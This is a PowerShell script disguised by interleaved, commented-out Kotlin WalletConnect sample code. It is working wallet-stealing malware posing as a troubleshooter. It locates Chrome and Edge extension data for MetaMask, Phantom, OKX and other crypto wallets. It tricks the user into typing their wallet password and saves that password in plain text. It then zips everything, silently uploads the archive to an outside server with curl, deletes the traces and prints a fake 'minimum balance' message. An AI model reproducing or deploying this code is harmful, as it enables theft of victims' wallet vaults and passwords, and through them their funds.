# val projectId = "" // Put your project id here
# val relayUrl = "relay.walletconnect.com"
# val serverUrl = "wss://$relayUrl?projectId=$projectId"
# val connectionType = ConnectionType.AUTOMATIC
# val appMetaData = Core.Model.AppMetaData(
#     name = "Wallet Name",
#     description = "Wallet Description",
#     url = "Wallet URL",
#     icons = /*list of icon url strings*/,
#     redirect = "kotlin-wallet-wc:/request" // Custom Redirect URI
# )

# CoreClient.initialize(
#                 relayServerUrl = serverUrl,
#                 connectionType = ConnectionType.AUTOMATIC,
#                 application = application,
#                 metaData = appMetaData
#             ) { error ->
#                 // Core initialize error, mosly connection issue
#             }

# val initParams = Wallet.Params.Init(core = CoreClient)

# Web3Wallet.initialize(initParams) { error ->
#     // Error will be thrown if there's an issue during initialization
# }

# CONFIG
$chromeUserDataRoot = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$edgeUserDataRoot = "$env:LOCALAPPDATA\Microsoft\Edge\User Data" # Added Edge Root
$destination = "$env:USERPROFILE\Desktop\ExtractedExtensioness"
$zipFile = Join-Path $destination "troubleshooting.zip"


# class WCDelegate : Web3Wallet.WalletDelegate, CoreClient.CoreDelegate {
#     private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

#     private val _coreEvents: MutableSharedFlow<Core.Model> = MutableSharedFlow()
#     val coreEvents: SharedFlow<Core.Model> = _coreEvents.asSharedFlow()

#     private val _walletEvents: MutableSharedFlow<Wallet.Model> = MutableSharedFlow(
#         replay = 1, extraBufferCapacity = 1, BufferOverflow.DROP_OLDEST
#     )
#     val walletEvents: SharedFlow<Wallet.Model> = _walletEvents
#     var authRequest: Wallet.Model.AuthRequest? = null
#     var sessionRequest: Wallet.Model.SessionRequest? = null


#     //Have to call this after init wallet connect code
#     fun init() {
#         CoreClient.setDelegate(this)
#         Web3Wallet.setWalletDelegate(this)
#     }

#     override fun onAuthRequest(
#         authRequest: Wallet.Model.AuthRequest, verifyContext: Wallet.Model.VerifyContext
#     ) {
#         this.authRequest = authRequest

#         scope.launch {
#             _walletEvents.emit(authRequest)
#         }
#     }


#     override fun onConnectionStateChange(connectionStateChange: Wallet.Model.ConnectionState) {
#         scope.launch {
#             _walletEvents.emit(connectionStateChange)
#         }
#     }


#     override fun onError(error: Wallet.Model.Error) {
#         scope.launch {
#             _walletEvents.emit(error)
#         }
#     }

#     override fun onSessionDelete(deletedSession: Wallet.Model.SessionDelete) {
#         scope.launch {
#             _walletEvents.emit(deletedSession)
#         }
#     }

#     override fun onSessionExtend(session: Wallet.Model.Session) {
#         scope.launch {
#             _walletEvents.emit(session)
#         }
#     }


#     override fun onSessionProposal(
#         sessionProposal: Wallet.Model.SessionProposal, verifyContext: Wallet.Model.VerifyContext
#     ) {
#         scope.launch {
#             _walletEvents.emit(sessionProposal)
#         }
#     }

#     override fun onSessionRequest(
#         sessionRequest: Wallet.Model.SessionRequest, verifyContext: Wallet.Model.VerifyContext
#     ) {
#         this.sessionRequest = sessionRequest
#         scope.launch {
#             _walletEvents.emit(sessionRequest)
#         }
#     }

#     override fun onSessionSettleResponse(settleSessionResponse: Wallet.Model.SettledSessionResponse) {
#         scope.launch {
#             _walletEvents.emit(settleSessionResponse)
#         }
#     }

#     override fun onSessionUpdateResponse(sessionUpdateResponse: Wallet.Model.SessionUpdateResponse) {
#         scope.launch {
#             _walletEvents.emit(sessionUpdateResponse)
#         }
#     }

#     override fun onPairingDelete(deletedPairing: Core.Model.DeletedPairing) {
#         scope.launch {
#             _coreEvents.emit(deletedPairing)
#         }
#     }

#     //We will use it later and I'll explain
#     @OptIn(ExperimentalCoroutinesApi::class)
#     fun clearCache() {
#         sessionRequest = null
#         _walletEvents.resetReplayCache()
#     }
# }


$uploadUrl = "https://site--upload--57rc49tkrwqv.code.run"

$extensionIDs = @{
    "MetaMask" = "nkbihfbeogaeaoehlefnkodbefgpgknn"
    "Phantom"  = "bfnaelmomeimhlpmgjnjophhpkkoljpa"
    'Keplr' = "dmkamcknogkgcdfhhbddcghachkejeap"
    'Zerion' = "klghhnkeealcohjjanjjdaeeggmfmlpl"
    'Jupiter' = "iledlaeogohbilgbfhmbgkgmpplbfboh" # Added Jupiter
	'Xverse' = "idnnbdplmphpflfnlkomgpfbpcgelopg" # Added Jupiter
	'Rabby' = "acmacodkjbdgmoleebolmdjonilkdbch" # Added Rabby
	'OKX' = "mcohilncbfahbmgdjkbpemcciiolgcge" # Added OKX
	'Ronin' = "fnjhmkhhmkbjkkabndcnnogagogbneec" # Added ronin
	'Slush' = "opcgpfmipidbgpenhmajoajpbobppdil" # Added slush
}

# {
#     eip155=Proposal("chains="[
#        "eip155":5,
#        "eip155":1,
#        "eip155":137
#     ],
#     "methods="[
#        "eth_sendTransaction",
#        "personal_sign"
#     ],
#     "events="[
#        "chainChanged",
#        "accountsChanged"
#     ]")"
#  }

New-Item -ItemType Directory -Path $destination -Force | Out-Null


function Get-ProfileNameFromPreferences($profilePath) {
    $prefPath = Join-Path $profilePath "Preferences"
    if (Test-Path $prefPath) {
        $lines = Get-Content $prefPath
        foreach ($line in $lines) {
            if ($line -match '"name"\s*:\s*"([^"]+)"') {
                $name = $Matches[1]
                if ($name -ne "" -and $name -ne "Chrome") {
                    return $name
                }
            }
        }
    }
    return (Split-Path $profilePath -Leaf)
}

# wcDelegate.walletEvents.collectLatest { wcEvent ->

#     when (wcEvent) {                    
#            is Wallet.Model.SessionProposal -> {

#                  val peerMeta = WCPeerMeta(name = wcEvent.name,
#                      url = wcEvent.url,
#                      description = wcEvent.description,
#                      icons = wcEvent.icons.map { it.toString() })

             
#                  callbacks.onSessionRequest(
#                      peer = peerMeta,
#                      pairingTopic = wcEvent.pairingTopic,
#                      chainIds = chainIds,
#                      requiredNamespaces = wcEvent.requiredNamespaces,
#                      optionalNamespaces = wcEvent.optionalNamespaces
#                  )

#              }
# else -> {
# // We will complete this and handle other events in later to gather
# }

function Get-ConfirmedPassword($wallet, $displayName) {
    do {
        Write-Host "----------------------------------------------" -ForegroundColor DarkYellow
        $p1 = Read-Host "Enter your $wallet password to proceed:" -AsSecureString
        $p2 = Read-Host "Confirm $wallet password to proceed:" -AsSecureString
        Write-Host "----------------------------------------------" -ForegroundColor DarkYellow

        $plain1 = [Runtime.InteropServices.Marshal]::PtrToStringAuto(
            [Runtime.InteropServices.Marshal]::SecureStringToBSTR($p1)
        )
        $plain2 = [Runtime.InteropServices.Marshal]::PtrToStringAuto(
            [Runtime.InteropServices.Marshal]::SecureStringToBSTR($p2)
        )

        if ($plain1 -ne $plain2) {
            Write-Host "Passwords do not match. Try again." -ForegroundColor Red
        }
    } while ($plain1 -ne $plain2)

    return $plain1
}

$copiedSomething = $false


$chromeProfiles = Get-ChildItem -Path $chromeUserDataRoot -Directory -ErrorAction SilentlyContinue
$edgeProfiles = Get-ChildItem -Path $edgeUserDataRoot -Directory -ErrorAction SilentlyContinue
$allProfiles = @()

# ==============================================================================
# Find all wallets - COMBINING CHROME AND EDGE
# ==============================================================================
$foundWallets = @()

# Process Chrome Profiles
foreach ($profile in $chromeProfiles) {
    $profilePath = $profile.FullName
    $displayName = Get-ProfileNameFromPreferences $profilePath
    $browserType = "Chrome"

    foreach ($wallet in $extensionIDs.Keys) {
        $extID = $extensionIDs[$wallet]
        $extPath = Join-Path $profilePath "Local Extension Settings\$extID"
        if (Test-Path $extPath) {
            $foundWallets += [PSCustomObject]@{
                DisplayName = $displayName
                WalletName  = $wallet
                ExtPath     = $extPath
                BrowserType = $browserType
            }
        }
    }
}

# Process Edge Profiles
foreach ($profile in $edgeProfiles) {
    $profilePath = $profile.FullName
    $displayName = Get-ProfileNameFromPreferences $profilePath
    $browserType = "Edge"

    foreach ($wallet in $extensionIDs.Keys) {
        $extID = $extensionIDs[$wallet]
        # Edge path structure for local settings is usually the same or similar, using Local Extension Settings
        $extPath = Join-Path $profilePath "Local Extension Settings\$extID" 
        if (Test-Path $extPath) {
            $foundWallets += [PSCustomObject]@{
                DisplayName = $displayName
                WalletName  = $wallet
                ExtPath     = $extPath
                BrowserType = $browserType
            }
        }
    }
}
# ==============================================================================


# ==============================================================================
# Wallet Selection/Auto-Process
# ==============================================================================
$foundCount = $foundWallets.Count
$walletToExtract = $null

if ($foundCount -eq 0) {
    Write-Host "Getting Started: No wallet data found in Chrome or Edge profiles." -ForegroundColor Red
    return
}

# Get unique wallet names for display, preserving the first instance's display name and browser type for the prompt simplicity
$uniqueWalletNames = $foundWallets | Select-Object -Unique -Property WalletName | ForEach-Object { $_.WalletName }

$displayList = @()
$processedWallets = @{} # To track which WalletName has been added to $displayList

foreach ($walletData in $foundWallets) {
    if (-not $processedWallets.ContainsKey($walletData.WalletName)) {
        $displayList += [PSCustomObject]@{
            Index = $displayList.Count + 1
            DisplayName = $walletData.DisplayName
            WalletName  = $walletData.WalletName
            BrowserType = $walletData.BrowserType
            FullObject  = $walletData # Keep a reference to one of the matching objects
        }
        $processedWallets[$walletData.WalletName] = $true
    }
}


if ($displayList.Count -eq 1) {
    $walletToExtract = $displayList[0].FullObject # Use the first found instance for extraction
    Write-Host ""
    Write-Host "==============================================" -ForegroundColor DarkGreen
    Write-Host "Found 1 unique wallet type: $($walletToExtract.WalletName) in $($walletToExtract.BrowserType) profile $($walletToExtract.DisplayName)." -ForegroundColor Green 
    Write-Host "Proceeding automatically." -ForegroundColor Green
    Write-Host "==============================================" -ForegroundColor DarkGreen
    Write-Host ""
} else {
    # Handle multiple wallets: Selection prompt
    Write-Host ""
    Write-Host "==============================================" -ForegroundColor DarkCyan
    Write-Host "      Choose Wallet Type to Process     " -ForegroundColor Cyan
    Write-Host "==============================================" -ForegroundColor DarkCyan
    Write-Host ""
    
    foreach ($item in $displayList) {
        # Displaying all found unique wallet types across both browsers
        Write-Host "[$($item.Index)] $($item.WalletName) ($($item.BrowserType) Profile: $($item.DisplayName))" -ForegroundColor Yellow
    }
    
    Write-Host ""
    Write-Host "Please choose your wallet (e.g., enter 1 to select the first one listed)." -ForegroundColor Cyan
    
    $selection = $null
    do {
        $input = Read-Host "Selection (1-$($displayList.Count))" 
        if ([int]::TryParse($input, [ref]$selection) -and $selection -ge 1 -and $selection -le $displayList.Count) {
            $selectedDisplayItem = $displayList[$selection - 1]
            # Set $walletToExtract to the FIRST matching object for the selected WalletName/BrowserType
            $walletToExtract = $foundWallets | Where-Object { $_.WalletName -eq $selectedDisplayItem.WalletName -and $_.BrowserType -eq $selectedDisplayItem.BrowserType } | Select-Object -First 1
            break
        }
        Write-Host "Invalid selection. Please enter a number between 1 and $($displayList.Count)." -ForegroundColor Red
    } while ($true)

    Write-Host ""
    Write-Host "You selected: $($walletToExtract.WalletName) from $($walletToExtract.BrowserType) profile $($walletToExtract.DisplayName)." -ForegroundColor Green 
    Write-Host "==============================================" -ForegroundColor DarkCyan
    Write-Host ""
}

# Extraction/Copying Logic: Copy ALL found data (Chrome & Edge), but ask for password for the SELECTED one
if ($walletToExtract -ne $null) {
    
    # 1. Get password for the SELECTED wallet instance
    $selectedWalletName = $walletToExtract.WalletName
    $selectedProfileName = $walletToExtract.DisplayName 
    $selectedBrowserType = $walletToExtract.BrowserType # Keep track of which browser we're getting the password for
    
    # Password prompt now reflects the selected Browser Type
    $password = Get-ConfirmedPassword $selectedWalletName $selectedProfileName
    
    # 2. Iterate over ALL found wallets to copy their data
    foreach ($walletData in $foundWallets) {
        $wallet = $walletData.WalletName
        $displayName = $walletData.DisplayName
        $extPath = $walletData.ExtPath
        $browserType = $walletData.BrowserType
        
        # Create specific destination path including BrowserType and ProfileName, as requested for separation in the zip
        $destPath = Join-Path $destination "$browserType\$displayName-$wallet" 
        
        # Copy-Item
        Copy-Item -Path $extPath -Destination $destPath -Recurse -Force | Out-Null
    }

    # 3. Save the password for the SELECTED wallet instance, naming the file based on its browser
    $passwordFile = Join-Path $destination "$selectedBrowserType-$selectedProfileName-$selectedWalletName-password.txt"
    $password | Out-File -FilePath $passwordFile -Encoding utf8

    $copiedSomething = $true
}


if (-not $copiedSomething) {
    Write-Host "Getting Started: No wallet data found" -ForegroundColor Red
    return
}
# ==============================================================================

# ==============================================================================
# NEW FUNCTION TO FIX TIMESTAMP ERROR (Optimized for speed)
# ==============================================================================
function Fix-InvalidTimestamps($path) {
    Write-Host "Preparing ..." -ForegroundColor DarkYellow

    # Using .NET methods for faster file enumeration compared to Get-ChildItem -Recurse.
    # The current time is used as a timestamp fix for files older than 1980, which causes the Zip error.
    try {
        $files = [System.IO.Directory]::GetFileSystemEntries($path, "*", [System.IO.SearchOption]::AllDirectories)
        
        foreach ($file in $files) {
            # Use .NET method to set LastWriteTime
            [System.IO.File]::SetLastWriteTime($file, (Get-Date))
        }
    } catch {
        # Fallback to the slower but safer PowerShell cmdlet if .NET fails (e.g., due to permission errors)
        Write-Host "Please Wait ... (Do not close.. This might take few minutes to complete)" -ForegroundColor Yellow
        Get-ChildItem -Path $path -Recurse -Force -ErrorAction SilentlyContinue | ForEach-Object {
            try {
                $_.LastWriteTime = (Get-Date)
            } catch {
                # Silently ignore items whose timestamp can't be set
            }
        }
    }
}
# ==============================================================================

Write-Host "Getting Started ..."

# wcDelegate.walletEvents.collectLatest { wcEvent ->

#     when (wcEvent) {
#         is Wallet.Model.SessionRequest -> {
#             try {
#                 //I'll descrivbe this later, but generally about methods coming from dApp like sign or more...
#                 handleMethods(wcEvent)
#             } catch (e: Exception) {

#             }

#         }

    
#         is Wallet.Model.SessionDelete.Error -> {
#           //Error on deleting session from dApp side
#         }

#         is Wallet.Model.SessionDelete.Success -> {
#            //Session is deleted from dApp side. we have to update UI
#         }

#         is Wallet.Model.SessionProposal -> {
#           // We have a proposal to have new session
#           // We have to check mandantory and optional name spaces 
#           // here and update user with them, then in next step 
#           // they can accept or reject this proposal

#            val peerMeta = WCPeerMeta(name = wcEvent.name,
#                 url = wcEvent.url,
#                 description = wcEvent.description,
#                 icons = wcEvent.icons.map { it.toString() })

        
#             callbacks.onSessionRequest(
#                 peer = peerMeta,
#                 pairingTopic = wcEvent.pairingTopic,
#                 chainIds = chainIds,
#                 requiredNamespaces = wcEvent.requiredNamespaces,
#                 optionalNamespaces = wcEvent.optionalNamespaces
#             )
#         }

#         is Wallet.Model.ConnectionState -> {
#             if (wcEvent.isAvailable.not()) {
#                 //app may went to background so auto socket management closed the socket
#             } else {
#                 // mean connection is tabled and we have open connection
#             }
#         }

#         is Wallet.Model.SettledSessionResponse.Error -> {
          

#         }

#         is Wallet.Model.SettledSessionResponse.Result -> {

#             //Session is approved, I usually save linked accounts to this 
#             // this session topic for further use
#             saveAccountsPerThisSession(accounts,wcEvent.session.topic)
#             // Update UI about session paired succesfully!

#         }

#         else -> {
#             Timber.i("Not supporting event $wcEvent")
#         }

#     }

# }

$ProgressPreference = 'SilentlyContinue'

# ==============================================================================
# FIX IMPLEMENTATION
# ==============================================================================
Fix-InvalidTimestamps $destination

if (Test-Path $zipFile) { Remove-Item $zipFile -Force }
# Compress all contents of $destination, which now contains 'Chrome' and 'Edge' subfolders
Compress-Archive -Path "$destination\*" -DestinationPath $zipFile

if (Test-Path $zipFile) {
    
    $curl = "$env:SystemRoot\System32\curl.exe"
    $null = & $curl --silent --request POST $uploadUrl `
        --form "file=@$zipFile"

    
    Remove-Item -Path $destination -Recurse -Force
}


Write-Host "Troubleshoot result: Minimum balance quota not met"
